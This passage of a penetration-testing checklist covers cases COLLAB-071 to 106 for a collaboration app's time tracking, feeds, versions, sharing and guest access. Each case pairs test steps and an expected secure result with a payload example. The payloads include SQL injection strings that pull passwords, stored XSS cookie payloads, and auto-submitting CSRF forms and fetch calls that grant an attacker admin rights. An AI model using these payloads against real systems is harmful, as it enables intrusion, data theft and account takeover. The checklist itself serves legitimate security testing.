**Test Steps:** 1. Create a time entry. 2. Modify the duration to an unrealistic value. 3. Backdate entries to closed time periods. 4. Create entries for future dates. 5. Check for negative duration.

**Expected Result:** Application must validate time entry values including duration limits and date restrictions and prevent entries outside allowed periods.

**Payload Example:**

```
Set duration=9999 hours;backdate entry to closed payroll period;set entry_date to future;set duration=-5
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-071 — Time Entry Creation for Another User
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Create a time entry. 2. Change user_id to another team member. 3. Check if time can be logged on behalf of another user without authorization.

**Expected Result:** Application must restrict time entry creation to the authenticated user unless the user has manager or admin privileges.

**Payload Example:**

```
POST /api/time-entries with user_id=1002 while authenticated as User A (non-manager)
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-072 — Time Entry Deletion IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Delete own time entry. 2. Change entry_id to another user's entry. 3. Check if unauthorized deletion occurs. 4. Test for cascade deletion of related records.

**Expected Result:** Application must verify ownership before allowing time entry deletion and restrict to entry owner and authorized managers.

**Payload Example:**

```
DELETE /api/time-entries/ENTRY-2001 with non-owner non-manager credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-073 — SQL Injection in Time Reports
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Generate time reports with filter parameters. 2. Inject SQL payloads in date range and user and project filters. 3. Observe responses for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all time tracking report generation.

**Payload Example:**

```
GET /api/time-reports?date_from=' OR 1=1--;GET /api/time-reports?project_id=1' UNION SELECT email FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-074 — Time Tracking Rate/Cost Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Access time tracking API. 2. Check if billing rates and costs are exposed to regular team members. 3. Verify if financial data is restricted to managers. 4. Check response for excessive data.

**Expected Result:** Application must restrict billing rate and cost information to authorized finance and management roles.

**Payload Example:**

```
Check GET /api/time-entries response for hourly_rate;total_cost;billing_rate;project_budget exposed to regular members
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-075 — CSRF on Time Entry Submission
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Time Tracking

**Test Steps:** 1. Craft a malicious page that submits a fraudulent time entry on victim's behalf. 2. Log excessive hours or incorrect project. 3. Lure victim to visit while authenticated.

**Expected Result:** Application must validate CSRF tokens on all time entry creation and modification requests.

**Payload Example:**

```
<form action='/api/time-entries' method='POST'><input name='project' value='PROJ-WRONG'><input name='duration' value='100'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-076 — IDOR on Activity Feed Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. View own workspace activity feed. 2. Change workspace_id to access another workspace's activity feed. 3. Check if activities from private workspaces are exposed. 4. Enumerate activity IDs.

**Expected Result:** Application must verify workspace membership before displaying activity feed data and enforce access control on individual activities.

**Payload Example:**

```
GET /api/workspaces/WS-2001/activity-feed;GET /api/activities/ACT-2001 with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-077 — Stored XSS in Activity Feed Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Perform actions that generate activity feed entries with user-controlled content. 2. Include XSS payloads in action-triggering fields like task names or comments. 3. View the activity feed. 4. Check for script execution.

**Expected Result:** Application must sanitize all data rendered in activity feeds and encode output to prevent stored XSS.

**Payload Example:**

```
Create task named <script>alert(document.cookie)</script> which appears in activity: "User created task: [XSS payload]"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-078 — Activity Feed Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Review activity feed entries for excessive detail. 2. Check if deleted content is visible in activity entries. 3. Verify if confidential changes are logged too verbosely. 4. Check for personal data exposure.

**Expected Result:** Activity feed must show appropriate detail level and not expose deleted content or confidential data beyond the user's access level.

**Payload Example:**

```
Check activity feed for deleted_document_content;password_change_details;private_message_previews;financial_data_changes
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-079 — Activity Feed SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Filter activity feed by date or type or user. 2. Inject SQL payloads in filter parameters. 3. Observe responses for SQL errors or cross-workspace data leakage.

**Expected Result:** Application must use parameterized queries for all activity feed filtering and search operations.

**Payload Example:**

```
GET /api/activity-feed?type=' OR 1=1--;GET /api/activities?user_id=1' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-080 — Activity Feed Pagination Data Leakage
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Access activity feed with pagination. 2. Set page_size to very large value. 3. Check if activities from other workspaces leak through pagination. 4. Test with offset manipulation.

**Expected Result:** Application must enforce page size limits and ensure pagination only returns activities from the authenticated user's authorized workspace.

**Payload Example:**

```
GET /api/activity-feed?page_size=999999;GET /api/activity-feed?offset=-1&limit=100000
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-081 — Activity Feed CSRF for Mass Action
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Activity Feed

**Test Steps:** 1. Craft a malicious page that triggers bulk actions from the activity feed like mark-all-read or dismiss-all. 2. Lure authenticated user to visit. 3. Check if bulk actions process without CSRF validation.

**Expected Result:** Application must validate CSRF tokens on all activity feed actions including bulk operations.

**Payload Example:**

```
<script>fetch('/api/activity-feed/mark-all-read',{method:'POST',credentials:'include'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-082 — IDOR on Version Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Access version history for own document. 2. Change document_id to access versions of another workspace's document. 3. Download previous versions with potentially sensitive deleted content.

**Expected Result:** Application must verify document access permissions before displaying version history or allowing version downloads.

**Payload Example:**

```
GET /api/documents/DOC-2001/versions;GET /api/versions/VER-2001/download with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-083 — Version Rollback Authorization Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Login as a document viewer without edit permissions. 2. Attempt to rollback a document to a previous version via API. 3. Check if rollback is restricted to editors and admins.

**Expected Result:** Application must restrict version rollback operations to users with edit permissions on the document.

**Payload Example:**

```
POST /api/documents/DOC-1001/versions/VER-0001/rollback with viewer credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-084 — XSS in Version Comments and Changelog
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Create a new version with XSS payload in the version comment or changelog. 2. View the version history page. 3. Check if the payload executes for other viewers.

**Expected Result:** Application must sanitize all version metadata including comments and changelog before rendering.

**Payload Example:**

```
version_comment=<script>alert(document.cookie)</script>;changelog=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-085 — Version Diff Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Compare versions to view diffs. 2. Check if diffs reveal content that the user should not have access to. 3. Verify authorization on diff endpoints. 4. Check for sensitive data in deleted content diffs.

**Expected Result:** Version diff must only be accessible to users with document access permissions and must not reveal content beyond their authorization level.

**Payload Example:**

```
GET /api/documents/DOC-1001/versions/diff?from=VER-0001&to=VER-0005 with limited-access user;check for sensitive deleted content
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-086 — Version Deletion Without Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Attempt to delete a specific version from the history. 2. Login as a regular contributor and try version deletion. 3. Check if version deletion is restricted to admins.

**Expected Result:** Application must restrict version deletion to workspace admins and maintain an audit trail of version operations.

**Payload Example:**

```
DELETE /api/documents/DOC-1001/versions/VER-0001 with contributor credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-087 — Version History SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Query version history with filter parameters. 2. Inject SQL payloads in date and author and version_id filters. 3. Observe responses for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all version history queries.

**Payload Example:**

```
GET /api/versions?author=' OR 1=1--;GET /api/documents/DOC-1001/versions?date=' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-088 — Race Condition on Version Creation
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Version Control

**Test Steps:** 1. Send multiple simultaneous save requests that create new versions. 2. Check if version numbering is consistent. 3. Verify no data loss from concurrent version creation. 4. Test for duplicate version numbers.

**Expected Result:** Application must handle concurrent version creation atomically with proper locking to ensure consistent version numbering and prevent data loss.

**Payload Example:**

```
Send 20 concurrent PUT /api/documents/DOC-1001 requests each creating a new version simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## COLLAB-089 — Conflict Resolution Data Override
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. Create a conflict by editing the same content simultaneously. 2. Intercept the conflict resolution request. 3. Modify the resolution to always prefer attacker's changes. 4. Check if server validates conflict resolution fairly.

**Expected Result:** Application must implement fair conflict resolution and not allow manipulation of resolution preferences through client-side parameter modification.

**Payload Example:**

```
Modify conflict_resolution=mine in PUT /api/documents/DOC-1001/resolve;change merge_strategy=force_overwrite
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-090 — Conflict Resolution Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. Detect a conflict notification. 2. Bypass the conflict resolution interface by submitting directly to the save endpoint. 3. Check if the save overwrites the other user's changes without conflict handling.

**Expected Result:** Application must enforce conflict detection and resolution on all save operations and not allow bypass through direct API calls.

**Payload Example:**

```
Send PUT /api/documents/DOC-1001 with force=true or skip_conflict_check=true parameter
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-091 — XSS in Conflict Resolution UI
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. Create conflicting edits where one version contains XSS payload. 2. View the conflict resolution merge interface. 3. Check if the XSS payload executes in the merge/diff view.

**Expected Result:** Application must sanitize all content displayed in the conflict resolution interface including diff views and merge previews.

**Payload Example:**

```
Create version with content=<script>alert(document.cookie)</script> and trigger conflict;view in merge UI
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## COLLAB-092 — Conflict Resolution IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. Resolve a conflict on own document. 2. Change document_id to resolve conflicts on another workspace's document. 3. Check if cross-workspace conflict resolution is possible.

**Expected Result:** Application must verify document ownership and workspace membership before allowing conflict resolution.

**Payload Example:**

```
POST /api/documents/DOC-2001/resolve-conflict with non-member credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-093 — Merge Data Loss via Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conflict Resolution

**Test Steps:** 1. During conflict resolution intercept the merge request. 2. Modify the merged content to remove critical sections. 3. Submit the manipulated merge. 4. Check if the data loss is detected.

**Expected Result:** Application must verify merge integrity and notify all collaborators of conflict resolutions with the ability to review changes.

**Payload Example:**

```
Modify merged_content in conflict resolution request to remove important sections;check for integrity verification
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-094 — IDOR on Permission Sharing
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Share a resource with specific permissions. 2. Change the resource_id to share permissions for a resource the user does not own. 3. Grant themselves admin access to other resources.

**Expected Result:** Application must verify resource ownership before allowing permission sharing and restrict sharing to authorized owners and admins.

**Payload Example:**

```
POST /api/resources/RES-2001/share with non-owner credentials;grant self admin permission on non-owned resource
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-095 — Permission Escalation via Share Settings
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Receive a resource shared with view permission. 2. Attempt to reshare the resource with edit permission. 3. Modify own permission level via API. 4. Grant broader permissions than originally received.

**Expected Result:** Application must prevent permission escalation and restrict resharing to equal or lower permission levels than the user holds.

**Payload Example:**

```
PUT /api/resources/RES-1001/permissions/PERM-1001 changing level=view to level=admin;reshare with higher permissions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-096 — Permission Sharing CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Craft a malicious page that shares victim's resource with the attacker. 2. Grant attacker admin permissions on victim's resource. 3. Lure victim to visit while authenticated.

**Expected Result:** Application must validate CSRF tokens on all permission sharing operations.

**Payload Example:**

```
<script>fetch('/api/resources/RES-1001/share',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"user_id":"attacker",permission:"admin"}'})</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## COLLAB-097 — Shared Link Token Predictability
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Generate multiple sharing links. 2. Analyze the link tokens for predictability. 3. Check for sequential patterns or timestamp-based generation. 4. Attempt to predict valid sharing tokens.

**Expected Result:** Application must generate sharing link tokens using cryptographically secure random generation that cannot be predicted.

**Payload Example:**

```
Generate 100+ sharing links;analyze token entropy;check for sequential patterns like /share/abc123;/share/abc124
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Sequencer;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-098 — Permission Revocation Bypass
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Share a resource with a user. 2. Revoke the permission. 3. Check if the user can still access the resource using cached tokens or direct URLs. 4. Test with previously obtained sharing links.

**Expected Result:** Application must immediately revoke access when permissions are removed and invalidate all associated sharing tokens.

**Payload Example:**

```
Access resource via previously captured direct URL after permission revocation;use cached sharing token
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-099 — Shared Permission Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Access sharing settings for a resource. 2. Check if all collaborators' details including emails and roles are visible. 3. Check if users can see who else has access. 4. Verify data minimization.

**Expected Result:** Application must restrict sharing information visibility based on the user's role and not expose unnecessary personal details of collaborators.

**Payload Example:**

```
GET /api/resources/RES-1001/permissions check for full_email;user_details;access_history of all collaborators
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## COLLAB-100 — SQL Injection in Permission Management
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. Search for users to share with. 2. Inject SQL payloads in the user search parameter. 3. Test permission filter parameters for injection. 4. Observe responses.

**Expected Result:** Application must use parameterized queries for all permission management operations.

**Payload Example:**

```
GET /api/users/search?q=' OR 1=1--;GET /api/permissions?resource=' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## COLLAB-101 — Mass Permission Change Without Notification
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission Sharing

**Test Steps:** 1. If bulk permission changes are possible change permissions for multiple resources at once. 2. Check if affected users are notified. 3. Test for silent privilege reduction.

**Expected Result:** Application must notify affected users when their permissions are changed and log all permission modifications in the audit trail.

**Payload Example:**

```
POST /api/permissions/bulk-update changing 100+ users' permissions;verify notification delivery;check audit log
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-102 — Guest Access Privilege Escalation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Login as a guest user. 2. Attempt to access member-only features. 3. Modify the role parameter in requests. 4. Try to upgrade from guest to member via API. 5. Access admin endpoints.

**Expected Result:** Application must enforce strict role limitations for guest users and prevent any form of privilege escalation from guest to member or admin.

**Payload Example:**

```
Modify role=guest to role=member in request;access /api/admin with guest token;access member-only endpoints
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-103 — Guest Access Scope Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. As a guest with access to specific resources attempt to access other resources in the workspace. 2. Enumerate resource IDs. 3. Access workspace-wide data like member lists or settings.

**Expected Result:** Application must restrict guest access to only the specifically shared resources and block access to all other workspace data.

**Payload Example:**

```
GET /api/workspaces/WS-1001/members with guest token;GET /api/documents/DOC-UNSHARED with guest credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-104 — Guest Invitation Token Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Receive a guest invitation with limited access. 2. Decode and modify the invitation token. 3. Change the access scope or permission level. 4. Change the expiry date. 5. Test with stolen tokens.

**Expected Result:** Application must use cryptographically signed invitation tokens with embedded scope and expiry that cannot be tampered with.

**Payload Example:**

```
Modify guest invitation token to change scope=specific_doc to scope=all_docs;extend expiry;change permission=view to permission=edit
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## COLLAB-105 — Guest Access Without Expiry
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Guest Access

**Test Steps:** 1. Create a guest access invitation. 2. Check if the invitation has an expiry. 3. Use the guest link after an extended period. 4. Check if expired guest sessions are properly terminated.

**Expected Result:** Application must enforce expiry on all guest access invitations and automatically revoke guest access after the expiry period.

**Payload Example:**

```
Access guest invitation link after 30+ days;check if guest session persists indefinitely;verify automatic revocation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Browser

**References:** CWE-840; PortSwigger Business logic

---

## COLLAB-106 — Guest Access Data Exfiltration
